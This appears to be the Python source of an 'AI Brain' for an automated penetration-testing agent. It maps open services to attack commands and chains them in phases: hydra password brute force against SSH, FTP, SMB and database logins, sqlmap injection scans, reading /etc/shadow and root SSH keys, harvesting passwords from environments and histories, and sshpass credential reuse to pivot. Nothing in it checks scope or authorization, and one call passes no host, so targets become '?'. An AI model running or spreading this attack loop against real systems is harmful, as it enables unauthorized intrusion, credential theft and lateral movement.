"""AI Brain - Thinks like a real pentester. Reasons about attack surface."""


class AttackSurface:
    """Analyze what we found and decide what to try."""

    # Service → Attack mapping (ordered by success probability)
    ATTACK_MAP = {
        "http": [
            {"tool": "gobuster dir -u http://{host}:{port} -w /usr/share/wordlists/dirb/common.txt -q", "reason": "Directory enumeration se hidden pages milenge"},
            {"tool": "nikto -h http://{host}:{port}", "reason": "Nikto se common vulns check honge"},
            {"tool": "whatweb http://{host}:{port}", "reason": "Technology detection"},
            {"tool": "sqlmap -u http://{host}:{port}/ --batch --crawl=2 --level=3 --risk=2", "reason": "SQL injection test"},
            {"tool": "ffuf -u http://{host}:{port}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -q", "reason": "Fast directory brute"},
        ],
        "https": [
            {"tool": "gobuster dir -u https://{host}:{port} -w /usr/share/wordlists/dirb/common.txt -q -k", "reason": "Directory enumeration (HTTPS)"},
            {"tool": "nikto -h https://{host}:{port} -ssl", "reason": "Nikto SSL test"},
            {"tool": "sqlmap -u https://{host}:{port}/ --batch --crawl=2 --level=3 --risk=2 --forms", "reason": "SQL injection with form testing"},
        ],
        "ssh": [
            {"tool": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f", "reason": "SSH brute force - common users"},
            {"tool": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f", "reason": "SSH brute force - admin user"},
            {"tool": "hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f", "reason": "SSH brute force - user account"},
            {"tool": "nmap --script ssh-auth-methods -p {port} {host}", "reason": "Check SSH auth methods"},
            {"tool": "nmap --script ssh-hostkey -p {port} {host}", "reason": "Check SSH host key"},
        ],
        "microsoft-ds": [
            {"tool": "enum4linux -a {host}", "reason": "Full SMB enumeration"},
            {"tool": "smbclient -L {host} -N", "reason": "Anonymous SMB share listing"},
            {"tool": "smbclient //{host}/IPC$ -N -c 'exit'", "reason": "Anonymous IPC check"},
            {"tool": "nmap --script smb-enum-shares -p {port} {host}", "reason": "SMB share enumeration"},
            {"tool": "nmap --script smb-vuln* -p {port} {host}", "reason": "SMB vulnerability check"},
            {"tool": "hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://{host} -t 4 -f", "reason": "SMB brute force"},
        ],
        "netbios-ssn": [
            {"tool": "enum4linux -a {host}", "reason": "NetBIOS enumeration"},
            {"tool": "nbtscan {host}", "reason": "NetBIOS scan"},
        ],
        "ldap": [
            {"tool": "ldapsearch -h {host} -x -b '' -s base namingContexts", "reason": "Anonymous LDAP bind check"},
            {"tool": "enum4linux -a {host}", "reason": "LDAP via enum4linux"},
            {"tool": "nmap --script ldap-search -p {port} {host}", "reason": "LDAP search"},
        ],
        "ftp": [
            {"tool": "nmap --script ftp-anon -p {port} {host}", "reason": "Anonymous FTP check"},
            {"tool": "hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://{host} -t 4 -f", "reason": "FTP anonymous login"},
            {"tool": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{host} -t 4 -f", "reason": "FTP brute force"},
            {"tool": "ftp {host}", "reason": "Manual FTP connection"},
        ],
        "mysql": [
            {"tool": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{host} -t 4 -f", "reason": "MySQL root brute force"},
            {"tool": "nmap --script mysql-info -p {port} {host}", "reason": "MySQL info gathering"},
        ],
        "ms-sql": [
            {"tool": "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{host} -t 4 -f", "reason": "MSSQL SA brute force"},
            {"tool": "nmap --script ms-sql-info -p {port} {host}", "reason": "MSSQL info gathering"},
        ],
        "http-proxy": [
            {"tool": "curl -x http://{host}:{port} http://10.10.10.1", "reason": "Test proxy"},
        ],
        "rtsp": [
            {"tool": "ffprobe rtsp://{host}:{port}", "reason": "RTSP stream probe"},
        ],
        "mqtt": [
            {"tool": "mosquitto_sub -h {host} -t '#' -W 5", "reason": "MQTT anonymous subscribe"},
        ],
        "modbus": [
            {"tool": "modbus-cli read-holding 1 0 10 {host}", "reason": "Modbus read registers"},
        ],
    }

    # Post-exploitation actions
    POST_EXPLOIT = {
        "user": [
            {"tool": "id && whoami", "reason": "Current user info"},
            {"tool": "uname -a", "reason": "System info"},
            {"tool": "cat /etc/passwd", "reason": "User enumeration"},
            {"tool": "sudo -l", "reason": "Check sudo rights"},
            {"tool": "find / -perm -u=s -type f 2>/dev/null", "reason": "Find SUID binaries"},
            {"tool": "cat /etc/crontab && ls /etc/cron.d/", "reason": "Check cron jobs"},
            {"tool": "ip addr && ip route", "reason": "Network interfaces and routes"},
            {"tool": "ss -tlnp", "reason": "Listening services"},
            {"tool": "cat /etc/hosts", "reason": "Hosts file"},
            {"tool": "env | grep -i pass", "reason": "Environment variables with passwords"},
            {"tool": "grep -rn password /etc/ 2>/dev/null | head -20", "reason": "Search passwords in configs"},
            {"tool": "cat ~/.bash_history | head -30", "reason": "Command history"},
        ],
        "root": [
            {"tool": "cat /etc/shadow", "reason": "Read shadow file"},
            {"tool": "cat /root/.ssh/id_rsa 2>/dev/null", "reason": "Root SSH keys"},
            {"tool": "cat /root/.bash_history", "reason": "Root command history"},
            {"tool": "find / -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -30", "reason": "Find config files"},
            {"tool": "iptables -L -n", "reason": "Firewall rules"},
            {"tool": "ip route", "reason": "Routing table"},
            {"tool": "arp -a", "reason": "ARP table - find other hosts"},
        ],
    }

    @staticmethod
    def get_attack_plan(services: list[dict], host: str = "?") -> list[dict]:
        """Given discovered services, create an attack plan."""
        plan = []
        for svc in services:
            port = svc.get("port", 0)
            service = svc.get("service", "").lower()
            version = svc.get("version", "")

            # Find matching attacks
            for svc_pattern, attacks in AttackSurface.ATTACK_MAP.items():
                if svc_pattern in service:
                    for attack in attacks:
                        plan.append({
                            "target_port": port,
                            "target_service": service,
                            "target_version": version,
                            "tool": attack["tool"].replace("{host}", host).replace("{port}", str(port)),
                            "reason": attack["reason"],
                            "priority": AttackSurface._get_priority(service, port),
                        })
                    break

        # Sort by priority (most likely to succeed first)
        plan.sort(key=lambda x: x["priority"], reverse=True)
        return plan

    @staticmethod
    def get_post_exploit_plan(access_level: str) -> list[dict]:
        """Get post-exploitation plan based on access level."""
        if access_level in AttackSurface.POST_EXPLOIT:
            return AttackSurface.POST_EXPLOIT[access_level]
        return AttackSurface.POST_EXPLOIT.get("user", [])

    @staticmethod
    def _get_priority(service: str, port: int) -> int:
        """Get attack priority (higher = try first)."""
        priorities = {
            "http": 90,
            "https": 85,
            "ssh": 70,
            "microsoft-ds": 80,
            "netbios-ssn": 75,
            "ldap": 78,
            "ftp": 65,
            "mysql": 60,
            "ms-sql": 62,
            "rtsp": 55,
            "mqtt": 50,
            "modbus": 50,
        }
        return priorities.get(service, 50)

    @staticmethod
    def reason_about_findings(state: dict) -> str:
        """Generate human-readable reasoning about current findings."""
        lines = []

        hosts = state.get("hosts", [])
        services = state.get("services", {})
        creds = state.get("credentials", [])
        access = state.get("access_map", {})

        if not hosts:
            return "Koi host nahi mila. Nmap se scan karte hain."

        lines.append(f"📊 {len(hosts)} hosts mil gaye.")

        if services:
            total_svcs = sum(len(svcs) for svcs in services.values())
            lines.append(f"🔍 {total_svcs} services open hain.")

            # Analyze each service
            for host, svcs in services.items():
                for svc in svcs:
                    port = svc.get("port", 0)
                    name = svc.get("service", "")

                    if name == "http":
                        lines.append(f"  → Port {port}: HTTP - Web app hai! Directory brute + SQLi try karenge.")
                    elif name == "ssh":
                        lines.append(f"  → Port {port}: SSH - Brute force try karenge.")
                    elif "microsoft-ds" in name:
                        lines.append(f"  → Port {port}: SMB - Anonymous access check + enum4linux.")
                    elif name == "ftp":
                        lines.append(f"  → Port {port}: FTP - Anonymous login check.")
                    elif name == "mysql":
                        lines.append(f"  → Port {port}: MySQL - Root brute force.")

        if creds:
            lines.append(f"🔑 {len(creds)} credentials mil gayi!")
            for c in creds:
                lines.append(f"  → [{c.get('type', '?')}] {str(c.get('value', ''))[:40]}")

        if access:
            for host, level in access.items():
                lines.append(f"🎯 {host}: {level} access mil gaya!")

        return "\n".join(lines)


class DecisionEngine:
    """Decide what to do next based on current state."""

    def decide_next(self, state: dict) -> list[str]:
        """Decide the next action(s) to take."""
        commands = []
        hosts = state.get("hosts", [])
        services = state.get("services", {})
        creds = state.get("credentials", [])
        access = state.get("access_map", {})
        failed = state.get("failed", [])
        commands_run = state.get("commands_run", [])

        # Phase 1: Discovery
        if not hosts or len(hosts) <= 1:
            target = state.get("target", "")
            commands.append(f"nmap -sn {target}")
            return commands

        # Phase 2: Service enumeration
        for host in hosts:
            if host not in services or not services[host]:
                commands.append(f"nmap -sV -sC -p- {host} --open")
                return commands

        # Phase 3: Attack based on services
        attack_plan = AttackSurface.get_attack_plan(
            [svc for svcs in services.values() for svc in svcs]
        )

        for attack in attack_plan:
            tool = attack["tool"].replace("{target}", hosts[0] if hosts else "")
            if tool not in failed and tool not in commands_run:
                commands.append(tool)
                if len(commands) >= 3:
                    break

        if commands:
            return commands

        # Phase 4: Post-exploitation
        if access:
            for host, level in access.items():
                post_plan = AttackSurface.get_post_exploit_plan(level)
                for action in post_plan:
                    tool = action["tool"]
                    if tool not in commands_run:
                        commands.append(f"sshpass -p '{creds[0].get('password', '')}' ssh {host} '{tool}'" if creds else tool)
                        if len(commands) >= 3:
                            break

        # Phase 5: Pivot discovery
        if access and creds:
            for host, level in access.items():
                if host not in state.get("pivoted", []):
                    cred = creds[0]
                    commands.append(f"sshpass -p '{cred.get('password', '')}' ssh {host} 'ip route'")

        return commands[:3]  # Max 3 commands per cycle
